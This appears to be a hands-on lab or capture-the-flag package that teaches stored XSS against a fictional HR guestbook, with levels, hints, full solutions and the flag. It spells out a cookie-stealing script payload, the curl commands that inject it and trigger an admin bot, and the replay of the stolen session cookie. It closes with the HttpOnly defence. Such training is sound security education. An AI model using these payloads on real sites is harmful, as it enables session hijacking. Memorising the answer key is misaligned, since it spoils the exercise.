title: Stored XSS — Cookie Theft via Admin Bot
description: Discover a stored cross-site scripting vulnerability in a company guestbook, inject a cookie-stealing payload, trigger the admin bot to visit the page, and retrieve the exfiltrated admin session token.
outcomes: Identify a guestbook form that stores user input and renders it unsanitised in the browser.
Understand how a stored XSS payload persists in the application and executes in every visitor's browser.
Craft a JavaScript payload that reads document.cookie and sends it to a collector endpoint.
Trigger the admin bot to visit the guestbook so the payload fires in an admin context.

levels.title: Introduction
levels.content:
# General information — please read carefully

* Work through the levels in order. Each level adds one step to the attack chain.
* Use the hints if you get stuck — they cost points but less than giving up.
* Only attack systems within your sandbox.

# Storyline

You are a web security analyst at a consultancy firm. Your client, **Ironwood Recruitment**, runs an internal HR portal. Among its features is a staff guestbook — a simple PHP page where employees can leave messages that are displayed to all visitors, including the HR administrator who checks the board every few minutes.

The development team thought this was harmless. It is not.

**Stored Cross-Site Scripting (XSS)** is a vulnerability where an attacker injects malicious JavaScript into data that is stored server-side and later rendered in other users' browsers. Unlike reflected XSS (where the payload appears in a URL parameter), stored XSS is particularly dangerous because:

- The payload persists in the database or file store until explicitly removed.
- Every user who loads the affected page executes the malicious script — including administrators.
- The script runs with the full privileges of the victim's browser session, including access to their cookies.

Session cookies are the keys to a web application. When a user logs in, the server issues a session cookie that the browser presents with every subsequent request. If an attacker can steal that cookie, they can impersonate the victim entirely — this is called **session hijacking**.

Ironwood's guestbook takes user input and writes it directly into the HTML page without HTML-escaping. The admin bot visits the guestbook regularly with an active admin session. A collector endpoint on the same server receives and stores data sent to it by JavaScript.

Your mission: find the guestbook, understand the bot mechanism, inject a script tag that reads the admin's session cookie and sends it to the collector, trigger the bot, and read the exfiltrated token. By the end you will know the name of the admin session cookie and why HttpOnly flags are the first line of defence.

levels.title: Get Access
levels.cloud_content:
SSH to your attacker machine at **10.1.31.23**, then reach the target portal:

```
curl http://10.1.31.10/
```

The target server is at **10.1.31.10** (HTTP port 80). Do not attack anything outside this sandbox. Submit **start** to begin.
levels.local_content:
Reach the target portal locally:

```
curl http://127.0.0.1/
```

Or open http://127.0.0.1/ in a browser. Submit **start** to begin.

levels.title: Discover the Guestbook
levels.content:
The Ironwood HR portal exposes three PHP pages relevant to this attack. Start by finding the guestbook — the page where users submit messages that are displayed to all visitors.

Try the most likely filename convention for a PHP guestbook:

```
curl http://10.1.31.10/guestbook.php
```

If you receive a page containing a form and some existing messages (rather than a 404), you have found it. Look at the HTML — note that there is a form with a `message` field, and previously submitted messages are rendered directly into the page below the form.

**What is the filename of the guestbook page?** (include the .php extension)
levels.solution:
``` $ curl -s http://10.1.31.10/guestbook.php | head -20

Ironwood Recruitment — Staff Guestbook

... ``` The guestbook is at **guestbook.php**.

hints.title: How to find the guestbook
hints.content: Try: curl http://10.1.31.10/guestbook.php. A 200 response with a form and messages confirms the file exists.

levels.title: Discover the Admin Bot
levels.content:
For a stored XSS attack to steal an admin cookie, an admin must visit the page with the injected payload in their browser session. In this simulation, there is a bot that mimics this behaviour — it visits the guestbook with an active admin session cookie set.

Investigate what other PHP pages exist on the server. Try:

```
curl http://10.1.31.10/bot.php
```

If the bot page responds (not a 404), this is the mechanism you will use to trigger the XSS payload. The bot endpoint visits the guestbook in a headless browser context with its admin session cookie attached — simulating the real-world scenario where the HR administrator views the guestbook.

Also check:

```
curl http://10.1.31.10/collect.php
```

This is the collector endpoint that will receive the stolen cookie data.

**What is the filename of the admin bot page?**
levels.solution:
```
$ curl http://10.1.31.10/bot.php
Bot visited guestbook.
```

The admin bot is at **bot.php**.

hints.title: What a bot page does
hints.content: The bot.php page simulates an admin visiting the guestbook. When you send a GET request to bot.php, it fetches the guestbook page with its admin_session cookie — causing any stored JavaScript to execute in the admin's browser context.

hints.title: The bot filename
hints.content: The admin bot page is called bot.php. Access it with: curl http://10.1.31.10/bot.php

levels.title: Craft the XSS Injection Tag
levels.content:
You know the guestbook renders input unsanitised. Now craft a payload that will execute JavaScript in the victim's browser.

The fundamental XSS vector is the HTML `<script>` tag. When a browser encounters `<script>...</script>` in a page, it executes the JavaScript inside it. If user-supplied input is rendered without escaping the `<` and `>` characters, the attacker can inject a script tag that runs arbitrary code.

Post a test payload to the guestbook to confirm execution:

```
curl -X POST \
  --data-urlencode "message=<script>alert('XSS')</script>" \
  http://10.1.31.10/guestbook.php
```

Then fetch the guestbook page and inspect the response — look for the `<script>` tag embedded in the HTML. If it appears verbatim (not escaped to `<script>`), the application is vulnerable.

**What is the name of the HTML tag used to inject JavaScript in this XSS attack?** (without angle brackets)
levels.solution:
```
$ curl -X POST \
    --data-urlencode "message=<script>alert('XSS')</script>" \
    http://10.1.31.10/guestbook.php

$ curl -s http://10.1.31.10/guestbook.php | grep script
  <script>alert('XSS')</script>
```

The tag is stored verbatim, confirming XSS. The tag name is **script**.

hints.title: What HTML tag runs JavaScript?
hints.content: The <script> tag tells a browser to interpret and execute its contents as JavaScript. Injecting this tag through a form is the most basic XSS vector.

hints.title: How to confirm the injection
hints.content: Post <script>alert('XSS')</script> as the message. Then run: curl -s http://10.1.31.10/guestbook.php | grep script. If the tag appears unescaped in the output, the app is vulnerable.

hints.title: The answer
hints.content: The HTML tag name is: script

levels.title: Identify the Collector Endpoint
levels.content:
Your cookie-stealing payload needs a destination — somewhere on the server to send the stolen session token. The application includes a collector endpoint that accepts data via HTTP request parameters and writes it to a file.

Verify the collector endpoint exists:

```
curl http://10.1.31.10/collect.php
```

The collector accepts a `data` query parameter. Anything passed to `?data=` is appended to a log file. Your XSS payload will use this endpoint to exfiltrate the admin's cookie:

```javascript
<script>fetch('/collect.php?data='+document.cookie)</script>
```

When the admin bot visits the guestbook, the script fires in the bot's browser context, reads `document.cookie`, and sends the value to `/collect.php`.

**What is the filename of the data collector endpoint?**
levels.solution:
```
$ curl http://10.1.31.10/collect.php
(empty or shows collected data)
```

The collector is at **collect.php**.

hints.title: What the collector does
hints.content: collect.php receives a ?data= parameter and writes it to a file on the server. Your JavaScript payload will call fetch('/collect.php?data='+document.cookie) to send the admin's cookie to this endpoint.

hints.title: How to check it exists
hints.content: Run: curl http://10.1.31.10/collect.php. A 200 response (even if empty) confirms the endpoint exists.

levels.title: Steal the Admin Cookie
levels.content:
Execute the full attack chain:

**Step 1 — Inject the cookie-stealing payload:**

```
curl -X POST \
  --data-urlencode "message=<script>fetch('/collect.php?data='+document.cookie)</script>" \
  http://10.1.31.10/guestbook.php
```

**Step 2 — Trigger the admin bot to visit the guestbook:**

```
curl http://10.1.31.10/bot.php
```

The bot visits the guestbook with its `admin_session` cookie. The script fires, reads `document.cookie`, and sends the value to `/collect.php`.

**Step 3 — Read the stolen cookie from the collector:**

```
curl http://10.1.31.10/collect.php
```

The collector shows everything that has been submitted to it. The admin_session cookie value is the flag.

**Submit the admin session cookie value (the flag).**
levels.solution:
```
# Step 1: inject payload
$ curl -X POST \
    --data-urlencode "message=<script>fetch('/collect.php?data='+document.cookie)</script>" \
    http://10.1.31.10/guestbook.php

# Step 2: trigger bot
$ curl http://10.1.31.10/bot.php
Bot visited guestbook.

# Step 3: read stolen cookie
$ curl http://10.1.31.10/collect.php
admin_session=WMG{xss_st0l3n_admin_s3ss10n}
```

The flag is **WMG{xss_st0l3n_admin_s3ss10n}**.

hints.title: What payload to inject
hints.content: Post this message: <script>fetch('/collect.php?data='+document.cookie)</script>. It reads document.cookie and sends it to the collector via a fetch() request.

hints.title: How to trigger the bot and read the result
hints.content: After injecting the payload, run: curl http://10.1.31.10/bot.php. Then read the collector: curl http://10.1.31.10/collect.php. The collected data contains the admin cookie.

hints.title: What the flag looks like
hints.content: The flag starts with WMG{ and ends with }. It is the value of the admin_session cookie collected from the bot.

levels.title: Name the Stolen Cookie
levels.content:
You retrieved the flag from the collector. Look at the full output of the collector again:

```
curl http://10.1.31.10/collect.php
```

The output shows the stolen cookie in `name=value` format. The **name** before the `=` sign is the session cookie name the application uses to authenticate the admin.

In a real engagement, knowing the cookie name is important: it tells you what header to forge when you replay the stolen session. You would add `Cookie: admin_session=VALUE` to every request to impersonate the admin without knowing their password.

The defence against this attack is the `HttpOnly` cookie flag — which makes cookies inaccessible to JavaScript. `document.cookie` only returns cookies that do NOT have `HttpOnly` set. This is why every session cookie should be set with `HttpOnly; Secure`.

**What is the name of the session cookie stolen from the admin?**
levels.solution:
```
$ curl http://10.1.31.10/collect.php
admin_session=WMG{xss_st0l3n_admin_s3ss10n}
```

The cookie name is **admin_session** — the part before the `=` sign.

hints.title: Where to find the cookie name
hints.content: Run: curl http://10.1.31.10/collect.php. The output is in the format name=value. The name is the word before the equals sign.

hints.title: What the cookie format looks like
hints.content: The collected data looks like: admin_session=WMG{...}. The cookie name is what comes before the = sign.

hints.title: The cookie name
hints.content: The session cookie is named: admin_session

levels.title: Feedback
levels.instructions: Please answer these questions to help us improve this game.

questions.text: How difficult did you find this game?
Before this game, had you exploited a cross-site scripting vulnerability?

choices.text: Yes, I had done it before
I knew about XSS but had not tried it
No, this was completely new to me

questions.text: How clear were the level instructions?
Which cookie attribute prevents JavaScript from reading a session cookie?
What would you change or add to improve this game?
